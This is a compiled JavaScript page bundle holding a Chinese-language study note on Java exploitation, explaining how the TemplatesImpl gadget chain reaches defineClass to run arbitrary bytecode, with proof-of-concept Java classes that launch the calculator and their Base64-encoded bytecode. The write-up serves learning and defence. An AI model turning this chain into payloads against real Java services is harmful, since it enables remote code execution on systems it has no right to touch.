"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[185],{7708:(n,s)=>{s.A=(n,s)=>{const a=n.__vccOpts||n;for(const[n,e]of s)a[n]=e;return a}},193:(n,s,a)=>{a.r(s),a.d(s,{comp:()=>f,data:()=>T});var e=a(4754);const t=a.p+"assets/img/image-20240413155437-izqk563.c87881e3.png",p=a.p+"assets/img/image-20240413155653-l3rczdw.52ddcfe2.png",c=a.p+"assets/img/image-20240413155920-izc58gd.cf8a12dd.png",l=a.p+"assets/img/image-20240413180352-10z5r3b.a7f1d5f7.png",o=a.p+"assets/img/image-20240413160051-dpx48es.a7b4385e.png",i=a.p+"assets/img/image-20240413160232-xkgb152.dd3d1134.png",u=a.p+"assets/img/image-20240413181626-h921ks3.1ec83b9e.png",r=a.p+"assets/img/image-20240413182741-q90ve3m.cedf11cb.png",k=a.p+"assets/img/image-20240413182712-yfhupn3.f50a4740.png",d=a.p+"assets/img/image-20240413183110-3y2kn94.75a44667.png",m=a.p+"assets/img/image-20240413184436-kufxpcs.3a8aa87e.png",A=a.p+"assets/img/image-20240413173753-4yk7k67.6451bea3.png",v=(0,e.Fv)('<h2 id="defineclass" tabindex="-1"><a class="header-anchor" href="#defineclass"><span>defineClass</span></a></h2><p>介绍之前首先还是要知道 defineClass 运行 bytecode 的利用方式，下面给出简单的代码。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">util</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RunCalc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token class-name">RunCalc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>\n        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用 ClassToBase64 转换</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\\tmp\\fatjsondemo\\target\\classes<span class="token operator">&gt;</span> java <span class="token class-name"><span class="token namespace">util<span class="token punctuation">.</span></span>ClassToBase64</span> <span class="token string">&quot;D:\\tmp\\fatjsondemo\\target\\classes\\util\\RunCalc.class&quot;</span>\nyv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTHV0aWwvUnVuQ2FsYzsBAApFeGNlcHRpb25zBwAZAQAKU291cmNlRmlsZQEADFJ1bkNhbGMuamF2YQwABwAIBwAaDAAbABwBAARjYWxjDAAdAB4BAAx1dGlsL1J1bkNhbGMBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAEAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAHAAQACAANAAkACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAAAAAIAEQ<span class="token operator">==</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>把它编译成字节码后转换成 Base64，之后放入下面运行，成功弹出计算器。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DefineClassTest</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>\n        <span class="token class-name">Method</span> defineClass <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">&quot;defineClass&quot;</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        defineClass<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">&quot;Base64 编码后的字节码即 .class 文件&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">Class</span> clazz<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defineClass<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;RunCalc&quot;</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> code<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+t+'" alt="image" loading="lazy">​</p><h2 id="利用-templatesimpl-执行字节码" tabindex="-1"><a class="header-anchor" href="#利用-templatesimpl-执行字节码"><span>利用 TemplatesImpl 执行字节码</span></a></h2><h3 id="利用链" tabindex="-1"><a class="header-anchor" href="#利用链"><span>利用链</span></a></h3><p>但是在实际场景中，<strong>因为 defineClass 方法作用域却是不开放的</strong>，所以我们很很难直接利用到它，因此就出现了这篇文章 TemplatesImpl，可以看到在 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader</code>​ 中的 defineClass 调用了此方法。</p><p>但是 TransletClassLoader 是内部类，只允许 TemplatesImpl 类中的方法调用，我们跟一下有哪些方法用到了 TransletClassLoader。</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p>‍</p><p>TemplatesImpl 类中只有一个方法 <code>TemplatesImpl#defineTransletClasses</code>​ 用到了 TransletClassLoader 类，但是是 <code>private</code>​ 类型。</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><p>有三个方法调用了 <code>TemplatesImpl#defineTransletClasses()</code>​, 其中</p><ul><li>​<code>TemplatesImpl#getTransletIndex()</code>​ 是 public 属性的</li><li>​<code>TemplatesImpl#getTransletClasses()</code>​ 是 private 属性的</li><li>​<code>TemplatesImpl#getTransletInstance()</code>​ 是 private 属性的</li></ul><p>​<img src="'+l+'" alt="image" loading="lazy">​</p><h3 id="​gettransletinstance​" tabindex="-1"><a class="header-anchor" href="#​gettransletinstance​"><span>​getTransletInstance​</span></a></h3><p>再往上 TemplatesImpl 的 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>​​ 方法</p><p>这里注意需要满足 <code>_name != null; _class == null;</code>​</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><p>再往上 TemplatesImpl 的 <code>newTransformer</code>​ 方法，此时已经是 public 方法了外面可以直接调用，不需要再继续往上跟了 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code>​ 方法</p><p>​<img src="'+i+'" alt="image" loading="lazy">​</p><p>因此我们得到了一条利用链</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">TemplatesImpl</span>#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n    <span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n        <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n            <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="gettransletclasses" tabindex="-1"><a class="header-anchor" href="#gettransletclasses"><span>getTransletClasses</span></a></h3><p>TemplatesImpl 类中已经没有调用 <code>getTransletClasses()</code>​ 的方法了，而 <code>getTransletInstance()</code>​ 方法在 <code>public synchronized Transformer newTransformer</code>​ 方法中被调用了，即上面的。</p><h3 id="gettransletindex" tabindex="-1"><a class="header-anchor" href="#gettransletindex"><span>getTransletIndex</span></a></h3><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n    <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n        <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【失败】</strong></p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><p><strong>【why】</strong></p><p>为什么这条链不行呢，分别 debug 调试一下三条调用链发现最终到达 <code>defineClass</code>​ 的时候变量 b 的值是一样的。</p><p>这和 <code>defineClass()</code>​ 的特性有关。在 <code>defineClass</code>​ 被调用的时候，类对象是不会被初始化的，<strong>只有这个对象显式地调用其构造函数，初始化代码才能被执行</strong>。<br> 而且，即使我们将初始化代码放在类的 static 块中，在 <code>defineClass</code>​ 时也无法被直接调用到。所以，如果我们要使用 <code>defineClass</code>​ 在目标机器上执行任意代码，需要想办法调用构造函数。</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><h3 id="getoutputproperties" tabindex="-1"><a class="header-anchor" href="#getoutputproperties"><span>getOutputProperties</span></a></h3><p>​<code>TemplatesImpl#newTransformer()</code>​ 发现 <code>TemplatesImpl#getOutputProperties()</code>​ 调用了 <code>TemplatesImpl#newTransformer()</code>​ 并且它也是 public 类型的。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">TemplatesImpl</span>#<span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n<span class="token class-name">TemplatesImpl</span>#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n    <span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n        <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>\n            <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="测试" tabindex="-1"><a class="header-anchor" href="#测试"><span>测试</span></a></h3><p><strong>【执行】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesImplTest</span> <span class="token punctuation">{</span>\n\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>\n        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>\n        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">&quot;_class&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">&quot;_bytecodes&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">&quot;_name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;object&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">&quot;_tfactory&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        obj<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【准备需要执行的类字节码的 Base64 编码】</strong></p><ul><li><p><s>注意</s> <code>~~_tfactory~~</code> <s>必须为</s> <code>~~TransformerFactoryImpl~~</code> <s>对象。</s> -- 实测没有也行，不知为何。</p></li><li><p>另外 TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须<br> 是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>​​ 的子类。</p><p>【在哪呢？】在 <code>defineTransletClasses</code>​ 方法会进行一次基类判断。</p></li></ul><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><ul><li>​<code>PS D:\\tmp\\fatjsondemo\\target\\classes&gt; java util.ClassToBase64 &quot;D:\\tmp\\fatjsondemo\\target\\classes\\util\\TemplatesImplRunCalc.class&quot;</code>​​</li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">util</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesImplRunCalc</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>\n    <span class="token annotation punctuation">@Override</span>\n    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>\n\n    <span class="token punctuation">}</span>\n\n    <span class="token annotation punctuation">@Override</span>\n    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>\n\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">public</span> <span class="token class-name">TemplatesImplRunCalc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>  <span class="token punctuation">{</span>\n        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> base64\nyv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAbTHV0aWwvVGVtcGxhdGVzSW1wbFJ1bkNhbGM7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUnVuQ2FsYy5qYXZhDAAZABoHACcMACgAKQEABGNhbGMMACoAKwEAGXV0aWwvVGVtcGxhdGVzSW1wbFJ1bkNhbGMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA0ACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABIACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAFQAEABYADQAXAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0<span class="token operator">=</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><h2 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h2>',52),b={href:"https://blog.csdn.net/solitudi/article/details/119082164",target:"_blank",rel:"noopener noreferrer"},g={href:"https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/",target:"_blank",rel:"noopener noreferrer"},h={href:"https://blog.csdn.net/fnmsd/article/details/88543233",target:"_blank",rel:"noopener noreferrer"},y=(0,e.Lk)("p",null,"‍",-1),w={},f=(0,a(7708).A)(w,[["render",function(n,s){const a=(0,e.g2)("ExternalLinkIcon");return(0,e.uX)(),(0,e.CE)("div",null,[v,(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,[(0,e.Lk)("a",b,[(0,e.eW)("https://blog.csdn.net/solitudi/article/details/119082164"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",g,[(0,e.eW)("TemplatesImpl 利用链学习 | 